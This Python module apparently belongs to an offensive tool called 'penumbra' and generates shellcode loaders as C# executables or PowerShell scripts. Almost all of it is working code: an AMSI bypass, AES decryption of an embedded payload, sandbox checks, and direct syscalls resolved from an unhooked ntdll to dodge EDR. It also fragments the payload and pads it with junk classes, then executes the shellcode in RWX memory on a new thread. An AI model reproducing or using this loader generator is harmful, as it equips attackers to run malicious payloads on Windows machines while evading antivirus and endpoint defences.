"""Shellcode loader pass — generates a C# exe or PS1 script that decrypts and executes shellcode.

The C# loader targets .NET Framework 4.7.2 (net472) so it runs on any modern
Windows without requiring a separate .NET runtime installation.

The PS1 loader generates a standalone PowerShell script with:
- Reflection-based AMSI bypass (split strings)
- AES-256-CBC decryption
- Sandbox evasion (sleep acceleration, CPU count check)
- VirtualAlloc + CreateThread execution via Add-Type

Features:
- Sandbox evasion (sleep acceleration, CPU count check)
- AES-256-CBC decryption at runtime
- Direct syscalls via dynamic SSN resolution (bypasses EDR hooks on ntdll)
- HWBP+VEH patchless AMSI bypass (C#) / reflection bypass (PS1)
- Payload fragmented across multiple classes with junk code (C#)
- Plausible identifier names throughout
"""

from __future__ import annotations

import base64
import re
import secrets
import shutil
import subprocess
import tempfile
from pathlib import Path

from penumbra.dotnet.embed import (
    _fragment_payload,
    _generate_junk_class,
    _hwbp_veh_bypass_cs,
    _plausible_class,
    _plausible_field,
    _plausible_name,
)
from penumbra.types import PassConfig


def _rand_var() -> str:
    """Generate a randomized PowerShell variable name."""
    return "_" + secrets.token_hex(4)


def _split_string(s: str) -> str:
    """Split a string into concatenated fragments for evasion.

    Produces a PowerShell expression like ``('Sys'+'tem.Man'+'agement')``.
    """
    parts: list[str] = []
    i = 0
    while i < len(s):
        chunk_len = secrets.randbelow(4) + 2
        parts.append(s[i : i + chunk_len])
        i += chunk_len
    return "(" + "+".join(f"'{p}'" for p in parts) + ")"


def _generate_ps1_loader(
    encrypted_b64: str,
    key_b64: str,
    iv_b64: str,
) -> str:
    """Generate a PowerShell script that decrypts and executes shellcode."""
    # Random variable names for everything
    v_type = _rand_var()
    v_field = _rand_var()
    v_key = _rand_var()
    v_iv = _rand_var()
    v_enc = _rand_var()
    v_aes = _rand_var()
    v_dec = _rand_var()
    v_shellcode = _rand_var()
    v_t1 = _rand_var()
    v_t2 = _rand_var()
    v_code = _rand_var()
    v_addr = _rand_var()
    v_thread = _rand_var()

    # Split sensitive strings
    amsi_type = _split_string("System.Management.Automation.AmsiUtils")
    amsi_field = _split_string("amsiInitFailed")

    # AMSI bypass
    amsi_block = (
        f"${v_type} = [Ref].Assembly.GetType({amsi_type})\n"
        f"${v_field} = ${v_type}.GetField("
        f"{amsi_field}, 'NonPublic,Static')\n"
        f"${v_field}.SetValue($null, $true)\n"
    )

    # AES decryption
    decrypt_block = (
        f"${v_key} = [Convert]::FromBase64String('{key_b64}')\n"
        f"${v_iv} = [Convert]::FromBase64String('{iv_b64}')\n"
        f"${v_enc} = [Convert]::FromBase64String('{encrypted_b64}')\n"
        f"${v_aes} = [{_split_string('System.Security.Cryptography.Aes')}]::Create()\n"
        f"${v_aes}.Key = ${v_key}\n"
        f"${v_aes}.IV = ${v_iv}\n"
        f"${v_aes}.Mode = 'CBC'\n"
        f"${v_aes}.Padding = 'PKCS7'\n"
        f"${v_dec} = ${v_aes}.CreateDecryptor()\n"
        f"${v_shellcode} = ${v_dec}.TransformFinalBlock("
        f"${v_enc}, 0, ${v_enc}.Length)\n"
    )

    # Sandbox checks
    sandbox_block = (
        "if ([Environment]::ProcessorCount -lt 2) { return }\n"
        f"${v_t1} = Get-Date\n"
        "Start-Sleep -Milliseconds 1500\n"
        f"${v_t2} = Get-Date\n"
        f"if ((${v_t2} - ${v_t1}).TotalMilliseconds -lt 1000) {{ return }}\n"
    )

    # Randomized C# class name for Add-Type
    cs_class = "W" + secrets.token_hex(3)

    # Shellcode execution via Add-Type
    exec_block = (
        f"${v_code} = @\"\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        f"public class {cs_class} {{\n"
        '    [DllImport("kernel32.dll")]\n'
        "    public static extern IntPtr VirtualAlloc("
        "IntPtr a, uint s, uint t, uint p);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    public static extern IntPtr CreateThread("
        "IntPtr a, uint s, IntPtr addr, IntPtr p, uint f, IntPtr id);\n"
        '    [DllImport("kernel32.dll")]\n'
        "    public static extern uint WaitForSingleObject(IntPtr h, uint ms);\n"
        "}\n"
        "\"@\n"
        f"Add-Type ${v_code}\n"
        "\n"
        f"${v_addr} = [{cs_class}]::VirtualAlloc("
        f"[IntPtr]::Zero, [uint32]${v_shellcode}.Length, 0x3000, 0x40)\n"
        f"[System.Runtime.InteropServices.Marshal]::Copy("
        f"${v_shellcode}, 0, ${v_addr}, ${v_shellcode}.Length)\n"
        f"${v_thread} = [{cs_class}]::CreateThread("
        f"[IntPtr]::Zero, 0, ${v_addr}, [IntPtr]::Zero, 0, [IntPtr]::Zero)\n"
        f"[{cs_class}]::WaitForSingleObject(${v_thread}, [uint32]0xFFFFFFFF)\n"
    )

    return amsi_block + "\n" + decrypt_block + "\n" + sandbox_block + "\n" + exec_block


def _syscall_helper_cs(cls_name: str) -> str:
    """Generate C# source for dynamic syscall stub resolution.

    Reads a clean copy of ntdll.dll from disk (bypassing in-memory EDR hooks),
    parses the PE export directory to find Nt* functions, extracts the syscall
    service number (SSN) from each function prologue, and writes executable
    syscall stubs (``mov r10,rcx; mov eax,SSN; syscall; ret``) into RWX memory.
    The stubs are called via ``Marshal.GetDelegateForFunctionPointer``.
    """
    resolve_method = _plausible_name()
    stub_method = _plausible_name()
    ssn_method = _plausible_name()
    alloc_field = _plausible_field()
    thread_field = _plausible_field()
    init_method = _plausible_name()
    pe_offset_var = _plausible_field()
    export_rva_var = _plausible_field()

    # Use str.format() — C# braces are escaped as {{ }} in the template,
    # and Python substitution placeholders use {name}.
    template = (
        "using System;\n"
        "using System.IO;\n"
        "using System.Runtime.InteropServices;\n\n"
        "internal static class {cls}\n"
        "{{\n"
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall)]\n"
        "    internal delegate uint NtAllocDelegate(\n"
        "        IntPtr hProc, ref IntPtr baseAddr, IntPtr zeroBits,\n"
        "        ref IntPtr regionSize, uint allocType, uint protect);\n\n"
        "    [UnmanagedFunctionPointer(CallingConvention.StdCall)]\n"
        "    internal delegate uint NtThreadDelegate(\n"
        "        ref IntPtr hThread, uint access, IntPtr objAttr,\n"
        "        IntPtr hProc, IntPtr startAddr, IntPtr param,\n"
        "        bool suspended, uint stackZero, uint stackCommit,\n"
        "        uint stackReserve, IntPtr attrList);\n\n"
        "    internal static NtAllocDelegate {af};\n"
        "    internal static NtThreadDelegate {tf};\n\n"
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern IntPtr VirtualAlloc(\n"
        "        IntPtr addr, uint size, uint allocType, uint protect);\n\n"
        "    internal static void {im}()\n"
        "    {{\n"
        "        try\n"
        "        {{\n"
        "            var ntPath = Path.Combine(\n"
        "                Environment.GetFolderPath(\n"
        "                    Environment.SpecialFolder.System),\n"
        '                "nt" + "dl" + "l." + "dll");\n'
        "            byte[] pe = File.ReadAllBytes(ntPath);\n\n"
        "            int {pv} = BitConverter.ToInt32(pe, 0x3C);\n"
        "            int {ev} = BitConverter.ToInt32(\n"
        "                pe, {pv} + 0x88);\n"
        "            int exportSize = BitConverter.ToInt32(\n"
        "                pe, {pv} + 0x8C);\n"
        "            if ({ev} == 0 || exportSize == 0) return;\n\n"
        "            int numSect = BitConverter.ToUInt16(\n"
        "                pe, {pv} + 0x06);\n"
        "            int optSize = BitConverter.ToUInt16(\n"
        "                pe, {pv} + 0x14);\n"
        "            int sectStart = {pv} + 0x18 + optSize;\n\n"
        "            int ssnAlloc = {sm}(pe,\n"
        '                "Nt" + "Allocate" + "Virtual" + "Memory",\n'
        "                {ev}, numSect, sectStart);\n"
        "            int ssnThread = {sm}(pe,\n"
        '                "Nt" + "Create" + "Thread" + "Ex",\n'
        "                {ev}, numSect, sectStart);\n\n"
        "            if (ssnAlloc >= 0)\n"
        "                {af} =\n"
        "                    Marshal.GetDelegateForFunctionPointer<NtAllocDelegate>(\n"
        "                        {stm}(ssnAlloc));\n"
        "            if (ssnThread >= 0)\n"
        "                {tf} =\n"
        "                    Marshal.GetDelegateForFunctionPointer<NtThreadDelegate>(\n"
        "                        {stm}(ssnThread));\n"
        "        }}\n"
        "        catch {{ }}\n"
        "    }}\n\n"
        "    private static int {rm}(\n"
        "        byte[] pe, int rva, int numSect, int sectStart)\n"
        "    {{\n"
        "        for (int i = 0; i < numSect; i++)\n"
        "        {{\n"
        "            int hdr = sectStart + i * 40;\n"
        "            int vAddr = BitConverter.ToInt32(pe, hdr + 12);\n"
        "            int vSize = BitConverter.ToInt32(pe, hdr + 8);\n"
        "            int rawAddr = BitConverter.ToInt32(pe, hdr + 20);\n"
        "            if (rva >= vAddr && rva < vAddr + vSize)\n"
        "                return rva - vAddr + rawAddr;\n"
        "        }}\n"
        "        return rva;\n"
        "    }}\n\n"
        "    private static int {sm}(byte[] pe, string funcName,\n"
        "        int exportRva, int numSect, int sectStart)\n"
        "    {{\n"
        "        int exportOff = {rm}(\n"
        "            pe, exportRva, numSect, sectStart);\n"
        "        int numNames = BitConverter.ToInt32(pe, exportOff + 0x18);\n"
        "        int addrRva = BitConverter.ToInt32(pe, exportOff + 0x1C);\n"
        "        int nameRva = BitConverter.ToInt32(pe, exportOff + 0x20);\n"
        "        int ordRva = BitConverter.ToInt32(pe, exportOff + 0x24);\n\n"
        "        int nameOff = {rm}(\n"
        "            pe, nameRva, numSect, sectStart);\n"
        "        int ordOff = {rm}(\n"
        "            pe, ordRva, numSect, sectStart);\n"
        "        int addrOff = {rm}(\n"
        "            pe, addrRva, numSect, sectStart);\n\n"
        "        for (int i = 0; i < numNames; i++)\n"
        "        {{\n"
        "            int nRva = BitConverter.ToInt32(pe, nameOff + i * 4);\n"
        "            int nOff = {rm}(\n"
        "                pe, nRva, numSect, sectStart);\n"
        "            int end = nOff;\n"
        "            while (end < pe.Length && pe[end] != 0) end++;\n"
        "            string name = System.Text.Encoding.ASCII.GetString(\n"
        "                pe, nOff, end - nOff);\n"
        "            if (name != funcName) continue;\n\n"
        "            ushort ord = BitConverter.ToUInt16(pe, ordOff + i * 2);\n"
        "            int fRva = BitConverter.ToInt32(pe, addrOff + ord * 4);\n"
        "            int fOff = {rm}(\n"
        "                pe, fRva, numSect, sectStart);\n\n"
        "            if (fOff + 8 > pe.Length) return -1;\n"
        "            if (pe[fOff] == 0x4C && pe[fOff + 1] == 0x8B\n"
        "                && pe[fOff + 2] == 0xD1 && pe[fOff + 3] == 0xB8)\n"
        "                return BitConverter.ToInt32(pe, fOff + 4);\n"
        "            return -1;\n"
        "        }}\n"
        "        return -1;\n"
        "    }}\n\n"
        "    private static IntPtr {stm}(int ssn)\n"
        "    {{\n"
        "        byte[] stub = new byte[] {{\n"
        "            0x4C, 0x8B, 0xD1,\n"
        "            0xB8, 0, 0, 0, 0,\n"
        "            0x0F, 0x05,\n"
        "            0xC3\n"
        "        }};\n"
        "        byte[] ssnBytes = BitConverter.GetBytes(ssn);\n"
        "        Array.Copy(ssnBytes, 0, stub, 4, 4);\n\n"
        "        IntPtr mem = VirtualAlloc(\n"
        "            IntPtr.Zero, (uint)stub.Length, 0x3000, 0x40);\n"
        "        if (mem == IntPtr.Zero) return IntPtr.Zero;\n"
        "        Marshal.Copy(stub, 0, mem, stub.Length);\n"
        "        return mem;\n"
        "    }}\n"
        "}}\n"
    )
    return template.format(
        cls=cls_name,
        af=alloc_field,
        tf=thread_field,
        im=init_method,
        pv=pe_offset_var,
        ev=export_rva_var,
        sm=ssn_method,
        stm=stub_method,
        rm=resolve_method,
    )


def _generate_shellcode_loader_project(
    encrypted_b64: str,
    key_b64: str,
    iv_b64: str,
    project_dir: Path,
) -> None:
    """Generate a C# project that decrypts and executes shellcode."""
    chunks = _fragment_payload(encrypted_b64)

    used_class_names: set[str] = set()

    # Main class and identifiers
    main_cls = _plausible_class()
    used_class_names.add(main_cls)
    entry_method = _plausible_name()
    key_field = _plausible_field()
    iv_field = _plausible_field()
    result_var = _plausible_field()
    sc_var = _plausible_field()

    # AMSI bypass
    amsi_cls = _plausible_class()
    while amsi_cls in used_class_names:
        amsi_cls = _plausible_class()
    used_class_names.add(amsi_cls)
    amsi_method = _plausible_name()

    # Fragment holder classes
    fragment_classes: list[str] = []
    fragment_refs: list[str] = []

    for i, chunk in enumerate(chunks):
        cls_name = _plausible_class()
        while cls_name in used_class_names:
            cls_name = _plausible_class() + str(i)
        used_class_names.add(cls_name)
        field_name = _plausible_field()
        fragment_classes.append(
            f"internal static class {cls_name}\n{{\n"
            f"    internal static readonly string {field_name} =\n"
            f'        "{chunk}";\n'
            f"}}\n"
        )
        fragment_refs.append(f"{cls_name}.{field_name}")

    if len(fragment_refs) == 1:
        reassemble_expr = fragment_refs[0]
    else:
        reassemble_expr = " + ".join(fragment_refs)

    # Junk classes
    junk_classes: list[str] = []
    for _ in range(secrets.randbelow(4) + 5):
        junk_classes.append(_generate_junk_class(used_class_names))

    # Syscall helper class
    syscall_cls = _plausible_class()
    while syscall_cls in used_class_names:
        syscall_cls = _plausible_class()
    used_class_names.add(syscall_cls)

    # .csproj — net472 WinExe
    (project_dir / "Loader.csproj").write_text(
        '<Project Sdk="Microsoft.NET.Sdk">\n'
        "  <PropertyGroup>\n"
        "    <OutputType>WinExe</OutputType>\n"
        "    <TargetFramework>net472</TargetFramework>\n"
        "    <LangVersion>10</LangVersion>\n"
        "  </PropertyGroup>\n"
        "</Project>\n"
    )

    # AmsiBypass.cs
    (project_dir / "AmsiBypass.cs").write_text(
        _hwbp_veh_bypass_cs(amsi_cls, amsi_method, public=False)
    )

    # Syscall.cs — dynamic SSN resolution + syscall stubs
    syscall_src = _syscall_helper_cs(syscall_cls)
    (project_dir / "Syscall.cs").write_text(syscall_src)

    # Extract generated identifiers from the syscall source so Program.cs
    # can reference them without coupling to the random name generation.
    _init_m = re.search(r"internal static void (\w+)\(\)", syscall_src)
    _alloc_m = re.search(r"internal static NtAllocDelegate (\w+);", syscall_src)
    _thread_m = re.search(r"internal static NtThreadDelegate (\w+);", syscall_src)
    assert _init_m and _alloc_m and _thread_m
    sc_init = _init_m.group(1)
    sc_alloc = _alloc_m.group(1)
    sc_thread = _thread_m.group(1)

    # Identifiers for Program.cs
    wait_method = _plausible_name()
    sleep_check_var = _plausible_field()
    base_addr_var = _plausible_field()
    region_var = _plausible_field()
    thread_var = _plausible_field()

    # Use str.format() so C# braces are correctly escaped as {{ }}.
    program_template = (
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        "using System.Security.Cryptography;\n\n"
        "internal static class {mcls}\n"
        "{{\n"
        '    private static readonly string {kf} = "{kb}";\n'
        '    private static readonly string {ivf} = "{ivb}";\n\n'
        # Only WaitForSingleObject stays as PInvoke — rarely hooked
        '    [DllImport("kernel32.dll")]\n'
        "    private static extern uint {wm}(\n"
        "        IntPtr h, uint ms);\n\n"
        "    private static void {em}()\n"
        "    {{\n"
        # Sandbox: sleep acceleration
        "        var {scv} = DateTime.Now;\n"
        "        System.Threading.Thread.Sleep(1500);\n"
        "        if ((DateTime.Now - {scv}).TotalMilliseconds < 1000)\n"
        "            return;\n\n"
        # Sandbox: CPU count
        "        if (Environment.ProcessorCount < 2) return;\n\n"
        # AMSI bypass
        "        {ac}.{am}();\n\n"
        # Initialize direct syscall stubs from clean ntdll on disk
        "        {scc}.{sci}();\n\n"
        # Reassemble and decrypt
        "        var {rv} = Convert.FromBase64String(\n"
        "            {rae});\n"
        "        var keyBytes = Convert.FromBase64String({kf});\n"
        "        var ivBytes = Convert.FromBase64String({ivf});\n\n"
        "        using (var aes = Aes.Create())\n"
        "        {{\n"
        "            aes.Key = keyBytes;\n"
        "            aes.IV = ivBytes;\n"
        "            var dec = aes.CreateDecryptor();\n"
        "            var {sv} = dec.TransformFinalBlock(\n"
        "                {rv}, 0, {rv}.Length);\n\n"
        # Allocate RWX via NtAllocateVirtualMemory syscall
        "            IntPtr {bav} = IntPtr.Zero;\n"
        "            IntPtr {rgv} = (IntPtr){sv}.Length;\n\n"
        "            if ({scc}.{sca} != null)\n"
        "            {{\n"
        "                {scc}.{sca}(\n"
        "                    (IntPtr)(-1), ref {bav},\n"
        "                    IntPtr.Zero, ref {rgv},\n"
        "                    0x3000, 0x40);\n"
        "            }}\n\n"
        "            if ({bav} == IntPtr.Zero) return;\n\n"
        # Copy shellcode into allocated memory
        "            Marshal.Copy({sv}, 0, {bav},\n"
        "                {sv}.Length);\n\n"
        # Create thread via NtCreateThreadEx syscall
        "            IntPtr {tv} = IntPtr.Zero;\n"
        "            if ({scc}.{sct} != null)\n"
        "            {{\n"
        "                {scc}.{sct}(\n"
        "                    ref {tv}, 0x1FFFFF,\n"
        "                    IntPtr.Zero, (IntPtr)(-1),\n"
        "                    {bav}, IntPtr.Zero,\n"
        "                    false, 0, 0, 0, IntPtr.Zero);\n"
        "            }}\n\n"
        "            if ({tv} != IntPtr.Zero)\n"
        "                {wm}({tv}, 0xFFFFFFFF);\n"
        "        }}\n"
        "    }}\n\n"
        "    private static void Main(string[] args)"
        " => {em}();\n"
        "}}\n"
    )
    program_cs = program_template.format(
        mcls=main_cls,
        kf=key_field,
        kb=key_b64,
        ivf=iv_field,
        ivb=iv_b64,
        wm=wait_method,
        em=entry_method,
        scv=sleep_check_var,
        ac=amsi_cls,
        am=amsi_method,
        scc=syscall_cls,
        sci=sc_init,
        rv=result_var,
        rae=reassemble_expr,
        sv=sc_var,
        bav=base_addr_var,
        rgv=region_var,
        sca=sc_alloc,
        sct=sc_thread,
        tv=thread_var,
    )
    (project_dir / "Program.cs").write_text(program_cs)

    # Fragment files
    for i, frag_src in enumerate(fragment_classes):
        (project_dir / f"Fragment{i}.cs").write_text(
            "using System;\n\n" + frag_src
        )

    # Junk files
    for i, junk_src in enumerate(junk_classes):
        (project_dir / f"Module{i}.cs").write_text(
            "using System;\n\n" + junk_src
        )


class ShellcodeLoaderPass:
    """Generate a .NET Framework 4.7.2 exe that decrypts and runs shellcode.

    Expects input in the format produced by :class:`ShellcodeEncryptPass`:
    ``key (32 bytes) || IV (16 bytes) || AES-256-CBC ciphertext``.

    The generated exe includes sandbox evasion, AMSI bypass, direct syscalls
    (dynamic SSN resolution), payload fragmentation, and junk code.
    """

    @property
    def name(self) -> str:
        return "loader"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        if len(data) < 48 + 1:
            raise ValueError(
                "Encrypted shellcode too short. Expected "
                "[32-byte key][16-byte IV][ciphertext]."
            )

        fmt = config.extra.get("format")
        if fmt == "ps1":
            return self._apply_ps1(data)

        if not shutil.which("dotnet"):
            raise RuntimeError(
                "dotnet SDK not found. Install .NET 8+ SDK."
            )

        key = data[:32]
        iv = data[32:48]
        ciphertext = data[48:]

        key_b64 = base64.b64encode(key).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")
        encrypted_b64 = base64.b64encode(ciphertext).decode("ascii")

        tmp_dir = tempfile.mkdtemp(prefix="penumbra_sc_loader_")
        tmp_path = Path(tmp_dir)

        try:
            _generate_shellcode_loader_project(
                encrypted_b64, key_b64, iv_b64, tmp_path,
            )

            out_dir = tmp_path / "out"
            result = subprocess.run(
                [
                    "dotnet", "publish", str(tmp_path),
                    "-c", "Release", "-o", str(out_dir),
                    "--nologo",
                ],
                capture_output=True,
            )

            if result.returncode != 0:
                stderr = result.stderr.decode(
                    "utf-8", errors="replace"
                )
                stdout = result.stdout.decode(
                    "utf-8", errors="replace"
                )
                raise RuntimeError(
                    f"Loader build failed:\n{stderr}\n{stdout}"
                )

            exe_path = out_dir / "Loader.exe"
            if not exe_path.exists():
                files = (
                    [f.name for f in out_dir.iterdir()]
                    if out_dir.exists()
                    else []
                )
                raise RuntimeError(
                    f"Loader output not found. Files: {files}"
                )

            return exe_path.read_bytes()
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)

    def _apply_ps1(self, data: bytes) -> bytes:
        """Generate a PowerShell shellcode loader script."""
        key = data[:32]
        iv = data[32:48]
        ciphertext = data[48:]

        key_b64 = base64.b64encode(key).decode("ascii")
        iv_b64 = base64.b64encode(iv).decode("ascii")
        encrypted_b64 = base64.b64encode(ciphertext).decode("ascii")

        script = _generate_ps1_loader(encrypted_b64, key_b64, iv_b64)
        return script.encode("utf-8")
